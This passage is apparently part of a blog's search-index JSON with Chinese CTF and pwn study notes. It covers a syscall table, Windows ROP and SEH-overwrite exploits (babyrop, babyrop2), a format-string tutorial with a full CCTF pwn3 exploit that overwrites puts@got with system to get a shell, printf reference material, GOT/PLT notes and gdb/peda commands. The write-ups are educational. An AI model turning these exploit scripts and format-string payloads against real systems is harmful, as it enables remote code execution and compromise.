unsigned long *nmask unsigned long maxnode unsigned long addr unsigned long flags 240 sys_mq_open const char *u_name int oflag mode_t mode struct mq_attr *u_attr 241 sys_mq_unlink const char *u_name 242 sys_mq_timedsend mqd_t mqdes const char *u_msg_ptr size_t msg_len unsigned int msg_prio const stuct timespec *u_abs_timeout 243 sys_mq_timedreceive mqd_t mqdes char *u_msg_ptr size_t msg_len unsigned int *u_msg_prio const struct timespec *u_abs_timeout 244 sys_mq_notify mqd_t mqdes const struct sigevent *u_notification 245 sys_mq_getsetattr mqd_t mqdes const struct mq_attr *u_mqstat struct mq_attr *u_omqstat 246 sys_kexec_load unsigned long entry unsigned long nr_segments struct kexec_segment *segments unsigned long flags 247 sys_waitid int which pid_t upid struct siginfo *infop int options struct rusage *ru 248 sys_add_key const char *_type const char *_description const void *_payload size_t plen 249 sys_request_key const char *_type const char *_description const char *_callout_info key_serial_t destringid 250 sys_keyctl int option unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 251 sys_ioprio_set int which int who int ioprio 252 sys_ioprio_get int which int who 253 sys_inotify_init 254 sys_inotify_add_watch int fd const char *pathname u32 mask 255 sys_inotify_rm_watch int fd __s32 wd 256 sys_migrate_pages pid_t pid unsigned long maxnode const unsigned long *old_nodes const unsigned long *new_nodes 257 sys_openat int dfd const char *filename int flags int mode 258 sys_mkdirat int dfd const char *pathname int mode 259 sys_mknodat int dfd const char *filename int mode unsigned dev 260 sys_fchownat int dfd const char *filename uid_t user gid_t group int flag 261 sys_futimesat int dfd const char *filename struct timeval *utimes 262 sys_newfstatat int dfd const char *filename struct stat *statbuf int flag 263 sys_unlinkat int dfd const char *pathname int flag 264 sys_renameat int oldfd const char *oldname int newfd const char *newname 265 sys_linkat int oldfd const char *oldname int newfd const char *newname int flags 266 sys_symlinkat const char *oldname int newfd const char *newname 267 sys_readlinkat int dfd const char *pathname char *buf int bufsiz 268 sys_fchmodat int dfd const char *filename mode_t mode 269 sys_faccessat int dfd const char *filename int mode 270 sys_pselect6 int n fd_set *inp fd_set *outp fd_set *exp struct timespec *tsp void *sig 271 sys_ppoll struct pollfd *ufds unsigned int nfds struct timespec *tsp const sigset_t *sigmask size_t sigsetsize 272 sys_unshare unsigned long unshare_flags 273 sys_set_robust_list struct robust_list_head *head size_t len 274 sys_get_robust_list int pid struct robust_list_head **head_ptr size_t *len_ptr 275 sys_splice int fd_in loff_t *off_in int fd_out loff_t *off_out size_t len unsigned int flags 276 sys_tee int fdin int fdout size_t len unsigned int flags 277 sys_sync_file_range long fd loff_t offset loff_t bytes long flags 278 sys_vmsplice int fd const struct iovec *iov unsigned long nr_segs unsigned int flags 279 sys_move_pages pid_t pid unsigned long nr_pages const void **pages const int *nodes int *status int flags 280 sys_utimensat int dfd const char *filename struct timespec *utimes int flags 281 sys_epoll_pwait int epfd struct epoll_event *events int maxevents int timeout const sigset_t *sigmask size_t sigsetsize 282 sys_signalfd int ufd sigset_t *user_mask size_t sizemask 283 sys_timerfd_create int clockid int flags 284 sys_eventfd unsigned int count 285 sys_fallocate long fd long mode loff_t offset loff_t len 286 sys_timerfd_settime int ufd int flags const struct itimerspec *utmr struct itimerspec *otmr 287 sys_timerfd_gettime int ufd struct itimerspec *otmr 288 sys_accept4 int fd struct sockaddr *upeer_sockaddr int *upeer_addrlen int flags 289 sys_signalfd4 int ufd sigset_t *user_mask size_t sizemask int flags 290 sys_eventfd2 unsigned int count int flags 291 sys_epoll_create1 int flags 292 sys_dup3 unsigned int oldfd unsigned int newfd int flags 293 sys_pipe2 int *filedes int flags 294 sys_inotify_init1 int flags 295 sys_preadv unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h 296 sys_pwritev unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h 297 sys_rt_tgsigqueueinfo pid_t tgid pid_t pid int sig siginfo_t *uinfo 298 sys_perf_event_open struct perf_event_attr *attr_uptr pid_t pid int cpu int group_fd unsigned long flags 299 sys_recvmmsg int fd struct msghdr *mmsg unsigned int vlen unsigned int flags struct timespec *timeout 300 sys_fanotify_init unsigned int flags unsigned int event_f_flags 301 sys_fanotify_mark long fanotify_fd long flags __u64 mask long dfd long pathname 302 sys_prlimit64 pid_t pid unsigned int resource const struct rlimit64 *new_rlim struct rlimit64 *old_rlim 303 sys_name_to_handle_at int dfd const char *name struct file_handle *handle int *mnt_id int flag 304 sys_open_by_handle_at int dfd const char *name struct file_handle *handle int *mnt_id int flags 305 sys_clock_adjtime clockid_t which_clock struct timex *tx 306 sys_syncfs int fd 307 sys_sendmmsg int fd struct mmsghdr *mmsg unsigned int vlen unsigned int flags 308 sys_setns int fd int nstype 309 sys_getcpu unsigned *cpup unsigned *nodep struct getcpu_cache *unused 310 sys_process_vm_readv pid_t pid const struct iovec *lvec unsigned long liovcnt const struct iovec *rvec unsigned long riovcnt unsigned long flags 311 sys_process_vm_writev pid_t pid const struct iovec *lvec unsigned long liovcnt const struct iovcc *rvec unsigned long riovcnt unsigned long flags 312 sys_kcmp pid_t pid1 pid_t pid2 int type unsigned long idx1 unsigned long idx2 313 sys_finit_module int fd const char __user *uargs int flags 314 sys_sched_setattr pid_t pid struct sched_attr __user *attr unsigned int flags 315 sys_sched_getattr pid_t pid struct sched_attr __user *attr unsigned int size unsigned int flags 316 sys_renameat2 int olddfd const char __user *oldname int newdfd const char __user *newname unsigned int flags 317 sys_seccomp unsigned int op unsigned int flags const char __user *uargs 318 sys_getrandom char __user *buf size_t count unsigned int flags 319 sys_memfd_create const char __user *uname_ptr unsigned int flags 320 sys_kexec_file_load int kernel_fd int initrd_fd unsigned long cmdline_len const char __user *cmdline_ptr unsigned long flags 321 sys_bpf int cmd union bpf_attr *attr unsigned int size 322 stub_execveat int dfd const char __user *filename const char user *const user *argv const char user *const user *envp int flags 323 userfaultfd int flags 324 membarrier int cmd int flags 325 mlock2 unsigned long start size_t len int flags 326 copy_file_range int fd_in loff_t __user *off_in int fd_out loff_t __user * off_out size_t len unsigned int flags 327 preadv2 unsigned long fd const struct iovec __user *vec unsigned long vlen unsigned long pos_l unsigned long pos_h int flags 328 pwritev2 unsigned long fd const struct iovec __user *vec unsigned long vlen unsigned long pos_l unsigned long pos_h int flags","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"}]},{"title":"XMAN之旅-windows exploit technique","date":"2017-08-05T04:27:08.000Z","path":"2017/08/05/XMAN之旅-windows-exploit-technique/","text":"1. babyrop leak MSVCR100 address =&gt; get system address =&gt; get address of &quot;cmd.exe&quot; =&gt; overwrite return address with system address 123456789101112131415161718192021# -*- coding: utf-8 -*-from pwn import *p = process(\"./babyrop.exe\")p.recvuntil(\"name\")p.sendline(\"A\"*24)p.recvuntil(\"A\"*24)crt = p.recv(4)msvcr_base = u32(crt) - 0x1d1afsystem_address = msvcr_base + 0x62632cmd_address = msvcr_base + 0x43030payload = \"A\"*0xCC+\"AAAA\"+p32(system_address)+p32(0xdeadbeaf)+p32(cmd_address)p.recvuntil(\"input your message length\")p.sendline(str(len(payload)))p.sendline(payload)p.interactive() payload: padding + system_address + 4 bytes padding + cmd_address 2. babyrop2 leak babyrop2 address and stack address =&gt; get system(&quot;cmd.exe&quot;) address and seh address =&gt; get first seh handler offset 123456789101112131415161718192021222324252627# -*- coding: utf-8 -*-from pwn import *p = process(\"./babyrop2.exe\")p.recvuntil(\"input your name\")p.send(\"A\"*68+\"\\x0a\")p.recvuntil(\"A\"*68)crt = p.recv(8)babyrop2_address = (u32(crt[0:4]) &gt;&gt; 16) &lt;&lt; 16ebp_address = u32(crt[4:8]) + 0x4system_cmd_address = babyrop2_address + 0x1117print hex(babyrop2_address)print hex(ebp_address)message_address = ebp_address - 0xCCfirst_seh_address = ebp_address + 0x38offset = first_seh_address - message_addressnext_seh_address = ebp_address + 0x94payload = \"A\"*offset + p32(next_seh_address) + p32(system_cmd_address)+\"A\"*30000p.recvuntil(\"input your message length\")p.sendline(str(len(payload)))p.sendline(payload)p.interactive() 代码说明： 首先通过第一个printf函数leak出babyrop2地址、main函数中的ebp地址 然后通过ida获取message在main函数中偏移为[bp-CCh]，通过windbg获取first seh的地址与ebp之间的差值为0x38。于是结合起来就可以获得填充字符串数offset 通过windbg获取first ebp所指向的下一个seh地址 与 ebp之间的差值 0x94 为了让程序进入异常，我们在payload后加入很长的字符串 payload: padding + next_seh_address + system_cmd_address + long string 3. babyvtable了解一些基本的知识点 3.1 windows x64平台fastcall调用约定 前四个整型或指针类型参数由RCX,RDX,R8,R9依次传递，前四个浮点类型参数由XMM0,XMM1,XMM2,XMM3依次传递。 调用函数为前四个参数在调用栈上保留相应的空间，称作shadow space或spill slot。即使被调用方没有或小于4个参数，调用函数仍然保留那么多的栈空间，这有助于在某些特殊情况下简化调用约定。 除前四个参数以外的任何其他参数通过栈来传递，从右至左依次入栈。 由调用函数负责清理调用栈。 小于等于64位的整型或指针类型返回值由RAX传递。 浮点返回值由XMM0传递。 更大的返回值(比如结构体)，由调用方在栈上分配空间，并有RCX持有该空间的指针并传递给被调用函数，因此整型参数使用的寄存器依次右移一格，实际只可以利用3个寄存器，其余参数入栈。函数调用结束后，RAX返回该空间的指针。 除RCX,RDX,R8,R9以外，RAX、R10、R11、XMM4 和 XMM5也是易变化的(volatile)寄存器。 RBX, RBP, RDI, RSI, R12, R14, R14, and R15寄存器则必须在使用时进行保护。 在寄存器中，所有参数都是右对齐的。小于64位的参数并不进行高位零扩展，也就是高位是无法预测的垃圾数据。 3.2 C++虚表介绍 当类继承了父类（父类含有虚函数），或者类中本来就有虚函数，那么编译之后就会产生虚表。 若A、B继承了父类C，那么在rdata段中将会有连续的空间存放A继承C的虚函数指针、B继承C的虚函数指针 实例化A或B时，将会在栈空间，则地址的首部放置指向虚表的指针，紧接着是各个局部变量;若是new()创建，则是堆空间，这时局部变量放置到栈空间，malloc的变量放置到堆空间。 3.3 本题说明由于babyvtable使用了CFG、ASLR、DEP、GS、SafeSEHOP等完整的防护机制，看起来貌似无懈可击，但是CFG的堆地址随机分配，导致我们可以让结构体、结构体中某个变量malloc出的字符串 并不一定成前后分布。 兴许堆地址随机分配，可能造成结构体中某个变量malloc出的字符串在结构体的前面，从而堆溢出造成覆盖虚表指针等操作！ CFG打开一般需要连续malloc同一区域16次，或不连续malloc同一区域0x40次！打开CFG，意味着malloc的堆地址随机化！ 由于windows的ASLR是以页为单位，也即4k大小为单位，所以为了判断某个位置是否是结构体开始的虚表指针，只需要查找其在主程序中的位置偏移（33f0），由于页为4k，大小为1.5个字节，所以比较的时候是ord(msg[i])==0xf0 and (ord(msg[i+1])&amp;0x0f)==0x3 idata段中放置了一些程序用到的函数iat","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"调试","slug":"调试","permalink":"http://yoursite.com/tags/调试/"}]},{"title":"printf格式化漏洞","date":"2017-08-04T12:35:18.000Z","path":"2017/08/04/printf格式化漏洞/","text":"1. 格式化字符串漏洞基本原理格式化字符串漏洞在通用漏洞类型库CWE中的编号是134，其解释为“软件使用了格式化字符串作为参数，且该格式化字符串来自外部输入”。会触发该漏洞的函数很有限，主要就是printf、sprintf、fprintf等print家族函数。介绍格式化字符串原理的文章有很多，我这里就以printf函数为例，简单回顾其中的要点。 printf(&quot;format&quot;, arg1, arg2, ...) 其第一个参数为格式化字符串，用来告诉程序以什么格式进行输出！然后是参数1（偏移1），参数2（偏移2），... 下面是两张详细的说明图： 2. 格式化漏洞测试写出一下printf函数 printf(&quot;%8$x1234&quot;); gdb调试该程序，最后展示栈内容，得到如下图： 打印结果： 12341234 说明：A、8$ 表示栈空间从format string算起，偏移量为8的那个栈位置，在上图中format string对应的是地址0xffffd234，值为0x0804b438；而偏移为8的位置为0xffffd250，值为0x34333231(&quot;1234&quot;)，最终会输出的是偏移8地址上的值&quot;1234&quot;B、如果将上面的format换成%8$s1234，那么就相当于打印0x34333231处的字符串。而如果此处为funA@got地址，那么输出的字符串就会是funA的执行地址C、对于密码，输入“%2214x%8$hn”，其中，2214是0x8a6的10进制，而%8$hn表示将前面输出的字符数（即2214）写入偏移8处储存的栈地址所指向空间的低两字节处，即修改0x0d74为0x08a6；若用n，则%2214x需改为%4196518x，即需要输出4196518个字符，开销太大，特别是在远程攻击时，很可能导致连接断掉。 3.基本的格式化字符串参数 %c：输出字符，配上%n可用于向指定地址写数据。 %d：输出十进制整数，配上%n可用于向指定地址写数据。 %x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。 %p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。 %s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。 %n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。 %n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据 下面的结论是我最近的发现，是在调试逐渐加深理解的。printf(&quot;1234%n&quot;)：[偏移1]=4。也即修改的其实是栈上保存的地址中的值。如下图所示: 格式化字符串漏洞发生在栈中，利用方式以下几种： 修改变量的值，绕过认证 覆写GOT表 修改栈中保存的返回地址 而之所以可以这样修改，全是因为字符串被保存在在了栈中。若格式化字符串buf存储在堆中，也就是说我们输入的内容不会出现在栈里，那就不能通过向栈中写入地址的方式进行攻击，不过可以利用栈中已有的值进行攻击。 4. 实验测试4.1 CCTF-pwn3本题只有NX一个安全措施，且为32位程序。 通过IDA逆向及初步调试，可以知道以下两点。 用户名是“sysbdmin”字符串中每个字母的ascii码减1，即rxraclhm； 在打印（即get功能，sub_080487F6函数）put（本程序功能，不是libc的puts）上去的文件内容时存在格式化字符串漏洞，且格式化字符串保存在栈中，偏移为7。 主要利用思路就是先通过格式化字符串漏洞泄露出libc版本，从而得到system函数调用地址；然后将该地址写到puts函数GOT表项中，由于程序dir功能会调用puts，且调用参数是用户可控的，故当我们以“/bin/sh”作为参数调用puts（也就是dir功能）时，其实就是以“/bin/sh”为参数调用system，也就实现了getshell。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# -*- coding: utf-8 -*-#/usr/bin/env pythonfrom pwn import *elf = ELF(&apos;pwn3&apos;)libc = ELF(&apos;/lib32/libc.so.6&apos;)plt_puts = elf.symbols[&apos;puts&apos;]print &apos;plt_puts= &apos; + hex(plt_puts)got_puts = elf.got[&apos;puts&apos;]print &apos;got_puts= &apos; + hex(got_puts)p = process(&apos;./pwn3&apos;)username = &apos;rxraclhm&apos;def put(pr, name, content): pr.recvuntil(&quot;ftp&gt;&quot;) pr.sendline(&apos;put&apos;) pr.recvuntil(&quot;upload:&quot;) pr.sendline(name) pr.recvuntil(&quot;content:&quot;) pr.sendline(content)def get(pr, name, num): pr.recvuntil(&quot;ftp&gt;&quot;) pr.sendline(&apos;get&apos;) pr.recvuntil(&apos;get:&apos;) pr.sendline(name) return pr.recvn(num)def dir(pr): pr.recvuntil(&quot;ftp&gt;&quot;) pr.sendline(&apos;dir&apos;)def edit_func(name, address, num): num = num &amp; 0xff if num == 0 : num == 0x100 payload = &apos;%&apos; + str(num) + &apos;c%10$hhn&apos; payload = payload.ljust(12, &apos;A&apos;) put(p, name, payload + p32(address)) get(p, name, 0)def main(): &apos;&apos;&apos; gdb.attach(p, &quot;&quot;&quot; B * 0x080488A4 &quot;&quot;&quot;) &apos;&apos;&apos; p.readuntil(&quot;Name (ftp.hacker.server:Rainism):&quot;) p.sendline(username) put(p, &quot;/sh&quot;, &quot;%8$s&quot;+p32(got_puts)) text = get(p, &quot;/sh&quot;, 4) puts_addr = u32(text) print &apos;puts_addr= &apos; + hex(puts_addr) system_addr = puts_addr - (libc.symbols[&apos;puts&apos;] - libc.symbols[&apos;system&apos;]) print &apos;system_addr= &apos; + hex(system_addr) edit_func(&apos;n&apos;, got_puts, system_addr) edit_func(&apos;i&apos;, got_puts+1, system_addr&gt;&gt;8) edit_func(&apos;b&apos;, got_puts+2, system_addr&gt;&gt;16) edit_func(&apos;/&apos;, got_puts+3, system_addr&gt;&gt;24) dir(p) p.interactive() passif __name__ == &apos;__main__&apos;: main() 代码写的有点冗余，但主要的思路还是比较清晰： leak system_addr =&gt; write system_addr to puts@got =&gt; concat the /bin/sh =&gt; system(&#39;/bin/sh&#39;) 题目算是没什么坑的fmt的题，个人觉得这些题还是有以下解题技巧： 1.函数封装的好，能够节省很多时间； 2.使用%10$x这样的形式确定参数的偏移，使用%10\\$s这样的形式泄露特定地址数据，使用%c %n的组合拳来改写数据； 3.尽量使用%hn和%hhn，避免过多的返回； 4.最好在每次使用%n修改地址后，使用%s去确认一下修改是否成功，对于新手而言能节省大量的时间。","tags":[{"name":"c++","slug":"c","permalink":"http://yoursite.com/tags/c/"}]},{"title":"printf格式化字符串","date":"2017-08-04T11:58:27.000Z","path":"2017/08/04/printf格式化字符串/","text":"1. 格式化字符串定义格式化字符串，是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。 2. POSIX标准下的printf函数2.1 格式化占位符格式化字符串中的占位符用于指明输出的参数值如何格式化。 格式化占位符（format placeholder），语法是： %[parameter][flags][field width][.precision][length]type Parameter可以忽略或者是： 字符 描述 n$ n是用这个格式说明符（specifier）显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。 如果任意一个占位符使用了parameter，则其他所有占位符必须也使用parameter。这是POSIX扩展，不属于ISO C。例：printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17) 产生&quot;17 0x11; 16 0x10&quot; Flags可为0个或多个： 字符 描述 + 总是表示有符号数值的&#39;+&#39;或&#39;-&#39;号，缺省情况是忽略正数的符号。仅适用于数值类型。 空格 使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与&#39;+&#39;同时出现，则空格说明符被忽略。 - 左对齐。缺省情况是右对齐。 # 对于&#39;g&#39;与&#39;G&#39;，不删除尾部0以表示精度。对于&#39;f&#39;, &#39;F&#39;, &#39;e&#39;, &#39;E&#39;, &#39;g&#39;, &#39;G&#39;, 总是输出小数点。对于&#39;o&#39;, &#39;x&#39;, &#39;X&#39;, 在非0数值前分别输出前缀0, 0x, and 0X表示数制。 0 如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。例如printf(&quot;%2d&quot;, 3)输出&quot; 3&quot;，而printf(&quot;%02d&quot;, 3)输出&quot;03&quot;。如果0与-均出现，则0被忽略，即左对齐依然用空格填充。 Field Width给出显示数值的最小宽度，典型用于制表输出时填充固定宽度的表目。实际输出字符的个数不足域宽，则根据左对齐或右对齐进行填充。实际输出字符的个数超过域宽并不引起数值截断，而是显示全部。宽度值的前导0被解释为0填充标志，如上述；前导的负值被解释为其绝对值，负号解释为左对齐标志。如果域宽值为*，则由对应的函数参数的值为当前域宽。 Precision通常指明输出的最大长度，依赖于特定的格式化类型。对于d、i、u、x、o的整型数值，是指最小数字位数，不足的位要在左侧补0，如果超过也不截断，缺省值为1。对于a,A,e,E,f,F的浮点数值，是指小数点右边显示的数字位数，必要时四舍五入；缺省值为6。对于g,G的浮点数值，是指有效数字的最大位数。对于s的字符串类型，是指输出的字节的上限，超出限制的其它字符将被截断。如果域宽为*，则由对应的函数参数的值为当前域宽。如果仅给出了小数点，则域宽为0。 Length指出浮点型参数或整型参数的长度。此项Microsoft称为“Size”。可以忽略，或者是下述： 字符 描述 hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。 h 对于整数类型，printf期待一个从short提升的int尺寸的整型参数。 l 对于整数类型，printf期待一个long尺寸的整型参数。对于浮点类型，printf期待一个double尺寸的整型参数。对于字符串s类型，printf期待一个wchar_t指针参数。对于字符c类型，printf期待一个wint_t型的参数。 ll 对于整数类型，printf期待一个long long尺寸的整型参数。Microsoft也可以使用I64 L 对于浮点类型，printf期待一个long double尺寸的整型参数。 z 对于整数类型，printf期待一个size_t尺寸的整型参数。 j 对于整数类型，printf期待一个intmax_t尺寸的整型参数。 t 对于整数类型，printf期待一个ptrdiff_t尺寸的整型参数。 此外，在ISO C99广泛接受前，还有几个平台相关的length选项： 字符 描述 I 对于有符号整数类型，printf期待一个ptrdiff_t尺寸的整型参数。对于无符号整数类型，printf期待一个size_t尺寸的整型参数。常见于Win32/Win64平台。 I32 对于整数类型，printf期待一个32位（双字）的整型参数。常见于Win32/Win64平台。 I64 对于整数类型，printf期待一个64位（四字）的整型参数。常见于Win32/Win64平台。 q 对于整数类型，printf期待一个64位（四字）的整型参数。常见于BSD平台。 ISO C99的头文件inttypes.h包含了许多宏，用于平台独立的printf编码。例如： 2.2 类型Type，也称转换说明（conversion specification/specifier），可以是： 字符 描述 d,i 有符号十进制数值int。&#39;%d&#39;与&#39;%i&#39;对于输出是同义；但对于scanf()输入二者不同，其中%i在输入值有前缀0x或0时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。 u 十进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。 f,F double型输出10进制定点表示。&#39;f&#39;与&#39;F&#39;差异是表示无穷与NaN时，&#39;f&#39;输出&#39;inf&#39;, &#39;infinity&#39;与&#39;nan&#39;；&#39;F&#39;输出&#39;INF&#39;, &#39;INFINITY&#39;与&#39;NAN&#39;。小数点后的数字位数等于精度，最后一位数字四舍五入。精度默认为6。如果精度为0且没有#标记，则不出现小数点。小数点左侧至少一位数字。 e,E double值，输出形式为10进制的([-]d.ddd e[+/-]ddd). E版本使用的指数符号为E（而不是e）。指数部分至少包含2位数字，如果值为0，则指数部分为00。Windows系统，指数部分至少为3位数字，例如1.5e002，也可用Microsoft版的运行时函数_set_output_format 修改。小数点前存在1位数字。小数点后的数字位数等于精度。精度默认为6。如果精度为0且没有#标记，则不出现小数点。 g,G double型数值，精度定义为全部有效数字位数。当指数部分在闭区间 [-4,精度] 内，输出为定点形式；否则输出为指数浮点形式。&#39;g&#39;使用小写字母，&#39;G&#39;使用大写字母。小数点右侧的尾数0不被显示；显示小数点仅当输出的小数部分不为0。 x,X 16进制unsigned int。&#39;x&#39;使用小写字母；&#39;X&#39;使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。 o 8进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。 s 如果没有用l标志，输出null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用wcrtomb函数。 c 如果没有用l标志，把int参数转为unsigned char型输出；如果用了l标志，把wint_t参数转为包含两个元素的wchart_t数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。 p void *型 a,A double型的16进制表示，&quot;[−]0xh.hhhh p±d&quot;。其中指数部分为10进制表示的形式。例如：1025.010输出为0x1.004000p+10。&#39;a&#39;使用小写字母，&#39;A&#39;使用大写字母。（C++11流使用hexfloat输出16进制浮点数） n 不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 % &#39;%&#39;字面值，不接受任何flags, width, precision or length。 宽度与精度格式化参数可以忽略，或者直接指定，或者用星号&quot;*&quot;表示取对应函数参数的值。例如printf(&quot;%*d&quot;, 5, 10)输出&quot;10&quot;；printf(&quot;%.*s&quot;, 3, &quot;abcdef&quot;) 输出&quot;abc&quot;。 如果函数参数太少，不能匹配所有的格式参数说明符，或者函数参数的类型不匹配，将导致未定义（undefined）行为。过多的函数参数被忽略。许多时候，未定义的行为将导致格式化字符串攻击。 某些编译器，如GCC，会静态检查printf这一类函数的格式化参数并编译警告存在的问题（当使用编译标志-Wall或-Wformat）。GCC也会对用户自定义的printf风格函数做静态检查，如果在函数定义时使用了非标准的&quot;format&quot; __attribute__。 3. printf函数的引申其实不止printf函数可以格式化字符串，printf函数的变形也可以，例如printf_chk printf_chk和printf不同的地方有两点： 不能使用$n不连续的打印 在使用%n的时候会做一系列检查","tags":[{"name":"c++","slug":"c","permalink":"http://yoursite.com/tags/c/"},{"name":"信息泄露","slug":"信息泄露","permalink":"http://yoursite.com/tags/信息泄露/"}]},{"title":"got、plt表介绍","date":"2017-08-03T14:31:33.000Z","path":"2017/08/03/got、plt表介绍/","text":"1. GOT表和PLT表GOT（Global Offset Table，全局偏移表）是Linux ELF文件中用于定位全局变量和函数的一个表。PLT（Procedure Linkage Table，过程链接表）是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定。 2. 延迟绑定所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序 3. 延迟绑定的基本原理假如存在一个bar函数，这个函数在PLT中的条目为bar@plt，在GOT中的条目为bar@got，那么在第一次调用bar函数的时候，首先会跳转到PLT，伪代码如下： bar@plt: jmp bar@got patch bar@got 这里会从PLT跳转到GOT，如果函数从来没有调用过，那么这时候GOT会跳转回PLT并调用patch bar@got，这一行代码的作用是将bar函数真正的地址填充到bar@got，然后跳转到bar函数真正的地址执行代码。当我们下次再调用bar函数的时候，执行路径就是先后跳转到bar@plt、bar@got、bar真正的地址。具体来看个实例： vulnerable_function函数调用了read函数，由于read函数是动态链接加载进来的只有在链接的时候才知道地址，编译时并不知道地址 执行call _read函数会跳到plt表中寻找中： plt表中会继续跳入到got表中寻找 got表中的所存的read函数的地址便是在pwn6进程中的实际地址，也就是","tags":[{"name":"调试","slug":"调试","permalink":"http://yoursite.com/tags/调试/"}]},{"title":"gdb的调试与使用","date":"2017-08-03T14:22:50.000Z","path":"2017/08/03/gdb的调试与使用/","text":"1. 调试的快捷键peda带有的功能，直接输入命令，其就会给予提示（如果不是这样，基本上也是该命令就可以不带参数）。这儿就不多做介绍 1.1 基础的调试快捷键 s step，si步入 n 执行下一条指令 ni步入 b 在某处下断点，可以用 b * adrress b function_name info b 查看断点信息 delete 1删除第一个断点 c 继续 r 执行 disas addr 查看addr处前后的反汇编代码 1.2 显示数据 p 系列 p system/main 显示某个函数地址 p $esp 显示寄存器 p/x p/a p/b p/s。。。 p 0xff - 0xea 计算器 print &amp;VarName 查看变量地址 p * 0xffffebac 查看某个地址处的值 x系列 x/xw addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表 x/x $esp 查看esp寄存器中的值 x/s addr 查看addr处的字符串 x/b addr 查看addr处的字符 x/i addr 查看addr处的反汇编结果 info系列 info register $ebp 查看寄存器ebp中的内容 (简写为 i r ebp) i r eflags 查看状态寄存器 i r ss 查看段寄存器 i b 查看断点信息 i functions 查看所有的函数 disas addr 查看addr处前后的反汇编代码 stack 20 查看栈内20个值 show args 查看参数 vmmap 查看映射状况 peda带有 readelf 查看elf文件中各个段的起始地址 peda带有 parseheap 显示堆状况 peda带有 1.3 查找数据 find 查找字符串 peda带有 searchmem 查找字符串 peda带有 ropsearch &quot;xor eax,eax;ret&quot; 0x08048080 0x08050000 查找某段的rop peda带有 ropgadget 提供多个pop|ret可行结果 peda带有 1.4 修改数据 set $esp=0x110 修改寄存器的值 set *0xf7ff3234=0x08042334 修改内存的值 set args &quot;asdasg&quot; &quot;afdasgasg&quot; &quot;agasdsa&quot; 分别给参数1,2,3赋值 set args &quot;`python -c &#39;print &quot;1234\\x7f\\xde&quot;&#39;`&quot; 这个参数中用python脚本重写了一下，避免有些字符无法正确设置 r &quot;arg1&quot; &quot;arg2&quot; &quot;arg3&quot; 设置参数 run `$(perl -e &#39;print &quot;A&quot;x20&#39;)` 1.1 peda插件1234567891011121314151617181920212223Enhance the display of gdb: colorize and display disassembly codes, registers, memory information during debugging.Add commands to support debugging and exploit development (for a full list of commands use peda help):aslr -- Show/set ASLR setting of GDBchecksec -- Check for various security options of binarydumpargs -- Display arguments passed to a function when stopped at a call instructiondumprop -- Dump all ROP gadgets in specific memory rangeelfheader -- Get headers information from debugged ELF fileelfsymbol -- Get non-debugging symbol information from an ELF filelookup -- Search for all addresses/references to addresses which belong to a memory rangepatch -- Patch memory start at an address with string/hexstring/intpattern -- Generate, search, or write a cyclic pattern to memoryprocinfo -- Display various info from /proc/pid/pshow -- Show various PEDA options and other settingspset -- Set various PEDA options and other settingsreadelf -- Get headers information from an ELF fileropgadget -- Get common ROP gadgets of binary or libraryropsearch -- Search for ROP gadgets in memorysearchmem|find -- Search for a pattern in memory; support regex searchshellcode -- Generate or download common shellcodes.skeleton -- Generate python exploit code templatevmmap -- Get virtual mapping address ranges of section(s) in debugged processxormem -- XOR a memory region with a keyInstallation vmmap：查看当前程序映射的内存块dumprop： 2. 查找某个plt、got、plt_2 plt 可以直接使用pwntools中的ELF(elf).symbols(function_name) got 可以直接使用pwntools中的ELF(elf).got(function_name) plt_2 可以直接使用pwntools中的ELF(lib).symbols(function_name) 3. 查找程序所动态链接的库 file pwn3 pwn3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter 